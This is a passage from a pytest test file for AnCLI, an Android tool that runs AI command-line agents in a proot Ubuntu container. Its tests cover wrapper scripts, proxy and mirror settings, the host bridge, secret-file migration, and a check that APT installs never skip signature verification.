        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)

        core.generate_proot_wrapper("codex", {}, [])
        wrapper = (tmp_path / "ancli" / "bin" / "codex").read_text(encoding="utf-8")
        assert 'ANCLI_OPEN_WATCHER_PID=$!' in wrapper
        assert 'kill "$ANCLI_OPEN_WATCHER_PID"' in wrapper
        assert 'trap - INT TERM HUP EXIT' in wrapper
        assert 'INT) exit 130 ;;' in wrapper
        assert 'TERM) exit 143 ;;' in wrapper
        assert 'HUP) exit 129 ;;' in wrapper

    def test_set_proxy_mode_direct_clears_cache(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        ancli_dir.mkdir(parents=True)
        proxy_cache = ancli_dir / ".proxy_cache"
        proxy_cache.write_text("127.0.0.1 7890 1234567890\n", encoding="utf-8")
        proxy_cache_last = ancli_dir / ".proxy_cache_last"
        proxy_cache_last.write_text("127.0.0.1 7890\n", encoding="utf-8")
        cfg_file = tmp_path / "config.json"

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "CONFIG_FILE", str(cfg_file))

        ok, err = core.set_proxy_mode("direct")
        assert ok is True
        assert not proxy_cache.exists()
        assert not proxy_cache_last.exists()

    def test_android_command_dispatch(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        ancli_dir.mkdir(parents=True)
        probe_script = ancli_dir / "android-probe.sh"
        probe_script.write_text("#!/bin/sh\necho '{\"status\":\"ok\"}'\n", encoding="utf-8")

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        called_cmd = []

        def fake_call(cmd):
            called_cmd.extend(cmd)
            return 0

        monkeypatch.setattr(core.subprocess, "call", fake_call)
        try:
            core.android_command(["probe", "--json"])
        except SystemExit as e:
            assert e.code == 0
        assert os.path.normpath(str(probe_script)) == os.path.normpath(called_cmd[1])
        assert "probe" in called_cmd
        assert "--json" in called_cmd

    def test_android_command_host_bridge_ipc(self, tmp_path, monkeypatch, capsys):
        ancli_dir = tmp_path / "ancli"
        ancli_dir.mkdir(parents=True)
        probe_script = ancli_dir / "android-probe.sh"
        probe_script.write_text("#!/bin/sh\necho '{\"status\":\"ok\"}'\n", encoding="utf-8")
        bridge_dir = ancli_dir / ".bridge"
        (bridge_dir / "reqs").mkdir(parents=True)
        (bridge_dir / "active").write_text("1", encoding="utf-8")

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setenv("ANCLI_IN_CONTAINER", "1")

        # Simulate host watcher in background thread
        import threading
        import time
        def fake_host_watcher():
            for _ in range(50):
                reqs = list((bridge_dir / "reqs").glob("req_*.sh"))
                for r in reqs:
                    req_id = r.name.replace("req_", "").replace(".sh", "")
                    (bridge_dir / f"out_{req_id}").write_text("HOST_OUTPUT\n", encoding="utf-8")
                    (bridge_dir / f"exit_{req_id}").write_text("0\n", encoding="utf-8")
                    r.unlink()
                    return
                time.sleep(0.02)

        t = threading.Thread(target=fake_host_watcher)
        t.start()

        try:
            core.android_command(["probe", "--json"])
        except SystemExit as e:
            assert e.code == 0
        t.join(timeout=2.0)
        out, _ = capsys.readouterr()
        assert "HOST_OUTPUT" in out

    def test_status_json_includes_host_and_rootfs_arch(self, tmp_path, monkeypatch, capsys):
        ancli_dir = tmp_path / "ancli"
        ancli_dir.mkdir(parents=True)
        (ancli_dir / "bin").mkdir()
        (ancli_dir / "bin" / "proot").write_text("")
        rootfs = tmp_path / "rootfs"
        (rootfs / "bin").mkdir(parents=True)
        (rootfs / "bin" / "bash").write_text("")
        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "CONFIG_FILE", str(tmp_path / "config.json"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(ancli_dir / "installed.json"))
        monkeypatch.setattr(core, "UPDATE_CACHE", str(ancli_dir / "update_cache.json"))
        monkeypatch.setattr(core, "CONTAINER_CONFIG_FILE", str(ancli_dir / "container-config.json"))
        monkeypatch.setattr(core, "CONTAINER_PROFILES_FILE", str(ancli_dir / "container-profiles.json"))

        core.status_json()
        out, _ = capsys.readouterr()
        data = json.loads(out)
        assert "host_arch" in data
        assert "rootfs_arch" in data
        assert data["host_arch"] in ("arm64", "x86_64")
        assert data["container"]["config"]["host_arch"] in ("arm64", "x86_64")

    def test_android_command_container_bridge_inactive_errors_cleanly(self, tmp_path, monkeypatch, capsys):
        ancli_dir = tmp_path / "ancli"
        ancli_dir.mkdir(parents=True)
        probe_script = ancli_dir / "android-probe.sh"
        probe_script.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setenv("ANCLI_IN_CONTAINER", "1")

        try:
            core.android_command(["shell", "id"])
        except SystemExit as e:
            assert e.code == 1
        _, err = capsys.readouterr()
        assert "Android host bridge service is not running" in err


class TestAptSecurityRegression:
    def test_install_proot_curl_bootstrap_enforces_apt_gpg_verification(self, monkeypatch):
        """Regression test: APT bootstrap must never use AllowInsecureRepositories or --allow-unauthenticated."""
        recorded_cmds = []
        sandbox_called = []

        monkeypatch.setattr(core.shutil, "which", lambda name: None if name == "curl" else "/usr/bin/" + name)
        monkeypatch.setattr(core, "_ensure_apt_sandbox", lambda: sandbox_called.append(True))
        monkeypatch.setattr(core, "run_cmd", lambda cmd, **kw: recorded_cmds.append(cmd) or True)
        monkeypatch.setattr(core, "_install_proot_common", lambda app_id, app, registry=None: True)

        ok = core._install_proot("dummy-app", {
            "install_method": "cmd",
            "install_cmd": "npm install -g dummy-app",
        })

        assert ok is True
        assert sandbox_called == [True]
        assert len(recorded_cmds) == 2
        apt_cmd = recorded_cmds[0]
        assert "apt-get update" in apt_cmd
        assert "apt-get install" in apt_cmd
        assert "curl" in apt_cmd and "ca-certificates" in apt_cmd
        lower_apt = apt_cmd.lower()
        for forbidden in (
            "allowinsecurerepositories",
            "allow-unauthenticated",
            "allowunauthenticated",
            "check-valid-until=false",
            "trusted=yes",
        ):
            assert forbidden not in lower_apt, f"Forbidden APT bypass flag found: {forbidden}"


class TestMilestoneM1Fixes:
    """Offline unit coverage for M1 fixes F1-F9 and Interface Contracts 1-3."""

    def test_f1_module_version_fallback_matches_version_code(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "missing-mod"))
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "missing-ancli"))
        real_exists = os.path.exists
        monkeypatch.setattr(
            core.os.path,
            "exists",
            lambda p: False if str(p) == "/data/adb/modules/ancli/module.prop" else real_exists(p),
        )
        v_name, v_code = core._get_current_module_version()
        assert v_name == "v" + core.VERSION
        assert v_code == core.VERSION_CODE

    def test_f1_f9_prepare_release_prerelease_keeps_update_json_and_syncs_code(self, tmp_path):
        import importlib.util
        prep_path = os.path.join(os.path.dirname(__file__), "..", "scripts", "prepare_release.py")
        prep_spec = importlib.util.spec_from_file_location("prepare_release_mod", prep_path)
        prep = importlib.util.module_from_spec(prep_spec)
        prep_spec.loader.exec_module(prep)

        (tmp_path / "src" / "module").mkdir(parents=True)
        (tmp_path / "src" / "module" / "module.prop").write_text(
            "id=ancli\nversion=v1.2.650-beta\nversionCode=62\n", encoding="utf-8"
        )
        (tmp_path / "src" / "ancli-core.py").write_text(
            'VERSION = "1.2.650-beta"\nVERSION_CODE = 62\n', encoding="utf-8"
        )
        (tmp_path / "src" / "registry.json").write_text(
            '{\n  "version": "1.2.650-beta",\n  "apps": {}\n}\n', encoding="utf-8"
        )
        stable_manifest = {
            "version": "v1.2.612",
            "versionCode": 24,
            "zipUrl": "https://github.com/AHLLX/AnCLI/releases/download/v1.2.612/ancli-24-v1.2.612.zip",
        }
        (tmp_path / "update.json").write_text(json.dumps(stable_manifest, indent=2), encoding="utf-8")
        (tmp_path / "CHANGELOG.md").write_text("# Changelog\n\n## Unreleased — Notes\n- Fix\n", encoding="utf-8")

        prep.sync_release("v1.2.651-beta", 63, root=tmp_path)

        assert json.loads((tmp_path / "update.json").read_text(encoding="utf-8")) == stable_manifest
        core_txt = (tmp_path / "src" / "ancli-core.py").read_text(encoding="utf-8")
        assert 'VERSION = "1.2.651-beta"' in core_txt
        assert "VERSION_CODE = 63" in core_txt

    def test_f2_reset_environment_preserves_x86_64_loaders(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        rootfs = tmp_path / "rootfs"
        bin_dir = ancli_dir / "bin"
        bin_dir.mkdir(parents=True)
        (rootfs / "root").mkdir(parents=True)
        (ancli_dir / "registry.json").write_text('{"apps": {}}', encoding="utf-8")
        for keep in ("proot", "loader", "loader-m32", "ancli-core.py", "ancli_env.sh", "registry.json"):
            (bin_dir / keep).write_text("keep", encoding="utf-8")
        (bin_dir / "stale-wrapper").write_text("drop", encoding="utf-8")

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(ancli_dir / "installed.json"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(ancli_dir / "secrets"))
        monkeypatch.setattr(core, "UPDATE_CACHE", str(ancli_dir / ".update_cache.json"))
        monkeypatch.setattr(core, "DNS_CACHE", str(ancli_dir / ".dns_cache"))
        monkeypatch.setattr(core, "SHARED_SKILL_DIR", str(rootfs / "root" / ".agents" / "skills"))
        monkeypatch.setattr(core, "SKILL_LINK_DIRS", ())
        monkeypatch.setattr(core, "_fix_config_permissions", lambda: None)

        core.reset_environment(verbose=False)
        for keep in ("proot", "loader", "loader-m32", "ancli-core.py", "ancli_env.sh", "registry.json"):
            assert (bin_dir / keep).exists()
        assert not (bin_dir / "stale-wrapper").exists()

    def test_f3_f8_repair_env_glob_mirror_single_guest_deploy_and_cp_fallback(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        rootfs = tmp_path / "rootfs"
        mod_dir = tmp_path / "mod"
        ksu_bin = tmp_path / "ksu"
        ap_bin = tmp_path / "ap"
        (ancli_dir / "bin").mkdir(parents=True)
        (rootfs / "etc").mkdir(parents=True)
        (rootfs / "usr" / "lib" / "python3.13").mkdir(parents=True)
        (rootfs / "usr" / "lib" / "python3.13" / "EXTERNALLY-MANAGED").write_text("x", encoding="utf-8")
        (mod_dir / "system" / "bin").mkdir(parents=True)
        (mod_dir / "system" / "bin" / "ancli").write_text("#!/bin/sh\n", encoding="utf-8")
        ksu_bin.mkdir()
        ap_bin.mkdir()

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "MOD_DIR", str(mod_dir))
        monkeypatch.setattr(core, "KSU_BIN", str(ksu_bin))
        monkeypatch.setattr(core, "AP_BIN", str(ap_bin))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(ancli_dir / "installed.json"))
        monkeypatch.setattr(core, "CONTAINER_CONFIG_FILE", str(ancli_dir / "container-config.json"))
        monkeypatch.setattr(core, "CONTAINER_PROFILES_FILE", str(ancli_dir / "container-profiles.json"))
        (ancli_dir / "container-config.json").write_text(json.dumps({"mirror": "ustc"}), encoding="utf-8")

        deploy_calls = []
        sys_cmds = []
        monkeypatch.setattr(core, "_deploy_xdg_open", lambda: None)
        monkeypatch.setattr(core, "_deploy_guest_ancli", lambda verbose=True: deploy_calls.append(verbose) or True)
        monkeypatch.setattr(core, "patch_dsh_web_cookie", lambda verbose=True: [])
        monkeypatch.setattr(core, "_fix_config_permissions", lambda: None)
        monkeypatch.setattr(core, "setup_skill_dirs", lambda verbose=False: {})
        monkeypatch.setattr(core, "setup_runtime_context", lambda verbose=False, refresh=True: {})
        monkeypatch.setattr(core, "ensure_android_data", lambda verbose=False: True)
        monkeypatch.setattr(core, "_deploy_agy_host_bash_compat", lambda verbose=False: [])
        monkeypatch.setattr(core, "_write_resolv_conf", lambda: None)
        monkeypatch.setattr(core.shutil, "copy2", lambda *a, **k: (_ for _ in ()).throw(OSError("SELinux denied")))
        monkeypatch.setattr(core.os, "system", lambda cmd: sys_cmds.append(cmd) or 0)

        core.repair_env({"apps": {}})

        assert not (rootfs / "usr" / "lib" / "python3.13" / "EXTERNALLY-MANAGED").exists()
        pip_conf = (rootfs / "etc" / "pip.conf").read_text(encoding="utf-8")
        assert "pypi.mirrors.ustc.edu.cn/simple" in pip_conf
        assert "# AnCLI managed" in pip_conf
        assert len(deploy_calls) == 1
        assert any("cp -f" in c and "ksu" in c for c in sys_cmds)
        assert any("cp -f" in c and "ap" in c for c in sys_cmds)

        # Custom user pip.conf without AnCLI marker must be preserved
        (rootfs / "etc" / "pip.conf").write_text("[global]\nindex-url = https://custom.example/simple\n", encoding="utf-8")
        core.repair_env({"apps": {}})
        assert "https://custom.example/simple" in (rootfs / "etc" / "pip.conf").read_text(encoding="utf-8")

    def test_f4_container_set_merges_existing_and_parses_mirror_proxy(self, tmp_path, monkeypatch, capsys):
        ancli_dir = tmp_path / "ancli"
        ancli_dir.mkdir(parents=True)
        cfg_file = ancli_dir / "container-config.json"
        profiles_file = ancli_dir / "container-profiles.json"
        profiles_file.write_text(json.dumps({
            "profiles": {
                "standard": {"name": "Standard", "estimated_size_mb": 420},
                "developer": {"name": "Developer", "estimated_size_mb": 900},
            }
        }), encoding="utf-8")
        cfg_file.write_text(json.dumps({
            "profile": "standard",
            "install_mode": "installed",
            "network_mode": "system",
            "mirror": "tuna",
            "proxy_url": "",
            "lang": "en",
            "default_cwd": "/sdcard/work",
            "agent_memory": "enabled",
        }), encoding="utf-8")

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        monkeypatch.setattr(core, "CONTAINER_CONFIG_FILE", str(cfg_file))
        monkeypatch.setattr(core, "CONTAINER_PROFILES_FILE", str(profiles_file))

        core.container_command([
            "set", "--profile=developer", "--network=manual",
            "--mirror=ustc", "--proxy-url=http%3A%2F%2F127.0.0.1%3A7890", "--json"
        ])
        out = json.loads(capsys.readouterr().out)
        assert out["config"]["profile"] == "developer"
        assert out["config"]["network_mode"] == "manual"
        assert out["config"]["mirror"] == "ustc"
        assert out["config"]["proxy_url"] == "http://127.0.0.1:7890"
        raw = json.loads(cfg_file.read_text(encoding="utf-8"))
        assert raw["lang"] == "en"
        assert raw["default_cwd"] == "/sdcard/work"
        assert raw["agent_memory"] == "enabled"
        assert raw["install_mode"] == "installed"

        # Empty --proxy-url= clears proxy_url
        core.container_command(["set", "--proxy-url=", "--json"])
        out2 = json.loads(capsys.readouterr().out)
        assert out2["config"]["proxy_url"] == ""

    def test_f5_settings_status_doctor_and_check_module_contracts(self, tmp_path, monkeypatch, capsys):
        ancli_dir = tmp_path / "ancli"
        mod_dir = tmp_path / "mod"
        (ancli_dir / "bin").mkdir(parents=True)
        (mod_dir / "system" / "bin").mkdir(parents=True)
        (mod_dir / "system" / "bin" / "bash").write_text("#!/system/bin/sh\n", encoding="utf-8")

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "missing-rootfs"))
        monkeypatch.setattr(core, "MOD_DIR", str(mod_dir))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "CONFIG_FILE", str(tmp_path / "cfg.json"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(ancli_dir / "installed.json"))
        monkeypatch.setattr(core, "CONTAINER_CONFIG_FILE", str(ancli_dir / "container-config.json"))
        monkeypatch.setattr(core, "CONTAINER_PROFILES_FILE", str(ancli_dir / "container-profiles.json"))
        monkeypatch.setattr(core, "ensure_android_data", lambda verbose=False: True)

        # container_profile works without rootfs
        core.settings_command(["--set", "container_profile=developer", "--set", "proxy_mode=manual", "--json"])
        cfg_payload = json.loads(capsys.readouterr().out)
        assert cfg_payload["container_profile"] == "developer"
        assert "container_profile" in cfg_payload["supported_keys"]

        # errors in --json mode go to stderr, stdout remains valid JSON
        with pytest.raises(SystemExit) as exc:
            core.settings_command(["--set", "unknown_key=1", "--json"])
        assert exc.value.code == 1
        captured = capsys.readouterr()
        assert json.loads(captured.out)["container_profile"] == "developer"
        assert "未知配置项" in captured.err

        core.status_json()
        st = json.loads(capsys.readouterr().out)
        assert st["version_code"] == core.VERSION_CODE
        assert st["execution_backend"] == "proot-ubuntu"
        assert st["proxy_mode"] == "manual"
        assert st["proxy_url"] == ""
        assert st["host_bash_compat"] is True

        core.doctor_json()
        doc = json.loads(capsys.readouterr().out)
        assert doc["host_compatibility"]["bash"]["installed"] is True

        monkeypatch.setattr(core, "check_module_update", lambda ch=None: (print("TLS warn"), {"status": "ok", "channel": ch or "stable"})[1])
        rc = core.check_module_command(["--channel=beta", "--json"])
        assert rc == 0
        cm = capsys.readouterr()
        assert json.loads(cm.out) == {"status": "ok", "channel": "beta"}
        assert "TLS warn" in cm.err

    def test_f6_registry_driven_metadata_and_agy_arch(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        rootfs = tmp_path / "rootfs"
        (ancli_dir / "bin").mkdir(parents=True)
        (rootfs / "usr" / "local" / "lib" / "node_modules" / "custom-pkg").mkdir(parents=True)
        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(ancli_dir / "installed.json"))
        monkeypatch.setattr(core, "UPDATE_CACHE", str(ancli_dir / ".update_cache.json"))

        # no_daemon override
        core.generate_proot_wrapper("codex", {}, [], no_daemon=False)
        assert "--no-daemon" not in (ancli_dir / "bin" / "codex").read_text(encoding="utf-8")
        core.generate_proot_wrapper("customcli", {}, [], no_daemon=True)
        assert "customcli --no-daemon" in (ancli_dir / "bin" / "customcli").read_text(encoding="utf-8")

        # requires_node driven by registry
        monkeypatch.setattr(core.shutil, "which", lambda n: "/usr/bin/curl")
        monkeypatch.setattr(core, "run_cmd", lambda cmd: True)
        monkeypatch.setattr(core, "_install_proot_common", lambda *a, **k: True)
        assert core._install_proot("custom-node", {"install_cmd": "npm i -g x", "requires_node": True}) is False
        assert core._install_proot("dsh", {"install_cmd": "npm i -g @deepseek-ai/dsh", "requires_node": False}) is True

        # agy url_by_arch
        seen_urls = []
        monkeypatch.setattr(core, "_detect_arch", lambda: "x86_64")
        monkeypatch.setattr(core, "_http_json", lambda u: seen_urls.append(u) or {"version": "9.9.9"})
        ver, _, err = core._latest_version({
            "latest": {
                "source": "json",
                "url": "https://example.com/linux_arm64.json",
                "url_by_arch": {
                    "arm64": "https://example.com/linux_arm64.json",
                    "x86_64": "https://example.com/linux_amd64.json",
                },
                "path": "version",
            }
        }, {})
        assert ver == "9.9.9" and err is None
        assert seen_urls == ["https://example.com/linux_amd64.json"]

        # integrity_pkg_json for arbitrary app
        (rootfs / "usr" / "local" / "bin").mkdir(parents=True, exist_ok=True)
        (rootfs / "usr" / "local" / "bin" / "ccli").write_text("x", encoding="utf-8")
        core.save_installed({"custom-app": {"executable": "ccli", "installed_version": "1.0.0"}})
        monkeypatch.setattr(core, "_probe_installed_version", lambda app, reg=None: "1.0.0")
        cache = core.check_updates({
            "apps": {
                "custom-app": {
                    "name": "Custom",
                    "executable": "ccli",
                    "version_cmd": "ccli --version",
                    "integrity_pkg_json": "custom-pkg",
                    "latest": {"source": "none"},
                }
            }
        })
        assert cache["integrity_results"]["custom-app"] is False

    def test_f7_f8_wrapper_bridge_isolation_direct_npm_unset_and_path(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        rootfs = tmp_path / "rootfs"
        (ancli_dir / "bin").mkdir(parents=True)
        (rootfs / "etc").mkdir(parents=True)
        (rootfs / "usr" / "local" / "bin").mkdir(parents=True)
        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))

        core.generate_proot_wrapper("dsh", {}, [], proxy_mode="direct")
        wrapper = (ancli_dir / "bin" / "dsh").read_text(encoding="utf-8")
        assert "ancli_open_drain" in wrapper
        assert ".open_url" in wrapper
        assert "ANCLI_BRIDGE_DIR" not in wrapper
        assert "ancli_bridge_drain" not in wrapper
        assert ".bridge/active" not in wrapper
        assert "npm_config_proxy" in wrapper and "npm_config_https_proxy" in wrapper
        assert "/root/.local/bin" in wrapper

        core._deploy_guest_ancli(verbose=False)
        etc_env = (rootfs / "etc" / "environment").read_text(encoding="utf-8")
        assert "/root/.local/bin" in etc_env

    def test_f8_reconfigure_executable_secrets_and_codex_perms_and_anchor(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        rootfs = tmp_path / "rootfs"
        secrets = tmp_path / "secrets"
        (ancli_dir / "bin").mkdir(parents=True)
        (rootfs / "root" / ".codex").mkdir(parents=True)
        secrets.mkdir(parents=True)

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(secrets))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(ancli_dir / "installed.json"))

        # Check _fix_config_permissions includes .codex
        sys_cmds = []
        monkeypatch.setattr(core.os, "system", lambda cmd: sys_cmds.append(cmd) or 0)
        core._fix_config_permissions()
        assert any(".codex" in cmd for cmd in sys_cmds)

        # Check reconfigure_app clears {executable}.env when values become empty
        reg = {"apps": {"codex-cli": {"name": "Codex", "executable": "codex", "optional_env_vars": ["OPENAI_API_KEY"]}}}
        core.save_installed({"codex-cli": {"executable": "codex", "installed_version": "0.1"}})
        core.reconfigure_app("codex-cli", reg, set_env={"OPENAI_API_KEY": "sk-123"})
        assert (secrets / "codex.env").exists()
        core.reconfigure_app("codex-cli", reg, set_env={"OPENAI_API_KEY": ""})
        assert not (secrets / "codex.env").exists()
        assert not (secrets / "codex-cli.env").exists()
        assert core.load_installed()["codex-cli"].get("configured_env", []) == []

        # Check runtime-context end marker anchor
        tpl = "<!-- ancli:runtime-context v1 -->\n<!-- ancli:first-run:end -->\n工具通过宿主 wrapper\n"
        injected = core._inject_runtime_context_bootstrap(tpl)
        assert core.RUNTIME_CONTEXT_PENDING_MARKER in injected
        assert injected.index(core.RUNTIME_CONTEXT_PENDING_MARKER) < injected.index(core.RUNTIME_CONTEXT_END_MARKER)
        replaced = core._replace_runtime_context_bootstrap(injected, {
            "checked_at": "2026-11-19T12:00:00+08:00",
            "execution_backend": "proot-ubuntu",
            "ancli_version": core.VERSION,
            "uid": 0, "euid": 0, "cwd": "/root",
            "android_data_mounted": True,
            "paths": {"rootfs": str(rootfs), "data_channel": "/mnt/ancli-data"},
            "commands": {"bash": True},
            "android_paths": {},
            "host_commands": {},
            "host_compatibility": {"bash": {"installed": True, "paths": []}},
            "installed_apps": [],
        })
        assert core.RUNTIME_CONTEXT_END_MARKER in replaced
        assert core.RUNTIME_CONTEXT_PENDING_MARKER not in replaced

    def test_f9_scripts_and_build_sh_hygiene(self):
        import subprocess
        root = os.path.join(os.path.dirname(__file__), "..")
        build_bytes = open(os.path.join(root, "build.sh"), "rb").read()
        assert b"\r" not in build_bytes
        assert b"build_module.py" in build_bytes

        probe_src = open(os.path.join(root, "scripts", "probe_dsh_web_page.py"), encoding="utf-8").read()
        assert "fFAqBwZUXRGOoCz" not in probe_src
        res = subprocess.run([sys.executable, os.path.join(root, "scripts", "probe_dsh_web_page.py")],
                             capture_output=True, text=True, env={k: v for k, v in os.environ.items() if k != "DSH_WEB_TOKEN"})
        assert res.returncode == 2
        assert "Missing dsh web token" in res.stderr

    def test_f4_normalize_proxy_url_and_cli_reject_malformed_urls(self, tmp_path, monkeypatch, capsys):
        ancli_dir = tmp_path / "ancli"
        ancli_dir.mkdir(parents=True)
        cfg_file = tmp_path / "cfg.json"
        container_cfg = ancli_dir / "container-config.json"
        profiles_file = ancli_dir / "container-profiles.json"
        profiles_file.write_text(json.dumps({
            "profiles": {"standard": {"name": "Standard", "estimated_size_mb": 420}}
        }), encoding="utf-8")
        container_cfg.write_text(json.dumps({"profile": "standard", "proxy_url": "http://127.0.0.1:7890"}), encoding="utf-8")
        cfg_file.write_text(json.dumps({"proxy_mode": "manual", "proxy_url": "http://127.0.0.1:7890"}), encoding="utf-8")

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        monkeypatch.setattr(core, "CONFIG_FILE", str(cfg_file))
        monkeypatch.setattr(core, "CONTAINER_CONFIG_FILE", str(container_cfg))
        monkeypatch.setattr(core, "CONTAINER_PROFILES_FILE", str(profiles_file))

        assert core._normalize_proxy_url("http://[::1]:7890") == (True, "http://[::1]:7890")
        assert core._normalize_proxy_url("127.0.0.1:7890") == (True, "http://127.0.0.1:7890")

        malformed = ("http://127.0.0.1:99999", "http://127.0.0.1:abc", "http://[::1", "127.0.0.1:99999")
        for bad in malformed:
            ok, msg = core._normalize_proxy_url(bad)
            assert ok is False and isinstance(msg, str) and msg

            ok_set, msg_set = core.set_proxy_url(bad)
            assert ok_set is False and msg_set == msg

            with pytest.raises(SystemExit) as c_exc:
                core.container_command(["set", f"--proxy-url={bad}"])
            assert str(c_exc.value) == msg

            with pytest.raises(SystemExit) as s_exc:
                core.settings_command(["--set", f"proxy_url={bad}", "--json"])
            assert s_exc.value.code == 1
            captured = capsys.readouterr()
            payload = json.loads(captured.out)
            assert payload["proxy_url"] == "http://127.0.0.1:7890"
            assert msg in captured.err

        assert json.loads(container_cfg.read_text(encoding="utf-8"))["proxy_url"] == "http://127.0.0.1:7890"

    def test_f8_reconfigure_app_legacy_secrets_migration_and_empty_all_vars_clears_configured_env(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        rootfs = tmp_path / "rootfs"
        secrets = tmp_path / "secrets"
        (ancli_dir / "bin").mkdir(parents=True)
        (rootfs / "root").mkdir(parents=True)
        secrets.mkdir(parents=True)

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(secrets))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(ancli_dir / "installed.json"))

        # 1. Legacy {app_id}.env migrates to {executable}.env when {executable}.env is absent
        (secrets / "codex-cli.env").write_text("export OPENAI_API_KEY=sk-legacy\n", encoding="utf-8")
        reg_with_vars = {
            "apps": {
                "codex-cli": {
                    "name": "Codex",
                    "executable": "codex",
                    "optional_env_vars": ["OPENAI_API_KEY", "OPENAI_BASE_URL"],
                }
            }
        }
        core.save_installed({"codex-cli": {"executable": "codex", "installed_version": "0.1"}})

        core.reconfigure_app("codex-cli", reg_with_vars, set_env={"OPENAI_BASE_URL": "https://api.example/v1"})

        assert not (secrets / "codex-cli.env").exists()
        assert (secrets / "codex.env").exists()
        migrated_txt = (secrets / "codex.env").read_text(encoding="utf-8")
        assert "OPENAI_API_KEY=sk-legacy" in migrated_txt
        assert "OPENAI_BASE_URL=https://api.example/v1" in migrated_txt
        installed = core.load_installed()["codex-cli"]
        assert set(installed["configured_env"]) == {"OPENAI_API_KEY", "OPENAI_BASE_URL"}
        assert "env" not in installed
        assert core._read_secrets_file("codex") == {
            "OPENAI_API_KEY": "sk-legacy",
            "OPENAI_BASE_URL": "https://api.example/v1",
        }

        # 2. When registry no longer defines any env vars and set_env is None, configured_env is cleared
        reg_no_vars = {"apps": {"codex-cli": {"name": "Codex", "executable": "codex"}}}
        (secrets / "codex-cli.env").write_text("export OLD_VAR=1\n", encoding="utf-8")
        core.reconfigure_app("codex-cli", reg_no_vars)
        assert not (secrets / "codex.env").exists()
        assert not (secrets / "codex-cli.env").exists()
        cleared = core.load_installed()["codex-cli"]
        assert cleared["configured_env"] == []
        assert "env" not in cleared
